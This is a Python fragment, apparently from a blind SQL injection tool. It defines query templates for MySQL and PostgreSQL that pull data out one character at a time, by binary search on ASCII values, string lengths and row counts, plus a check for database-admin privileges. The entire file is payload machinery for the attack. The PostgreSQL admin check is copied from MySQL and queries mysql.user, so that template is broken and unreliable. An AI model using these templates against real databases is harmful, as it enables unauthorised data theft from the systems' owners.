QUERIES = {
    "MYSQL": {
        'DB_VERSION': "select version()",
        'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
        'LENGTH_EXFIL_BIN': lambda sub_query,mid: F"select length(({sub_query}))>{mid}",
        'COUNT_EXFIL_BIN': lambda sub_query,mid: F"SELECT ({sub_query})>{mid}",
        'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
        'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
        'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1"
    },
    "POSTGRESQL": {
        'DB_VERSION': "select version()",
        'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
        'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
        'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
        'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1"
    }
}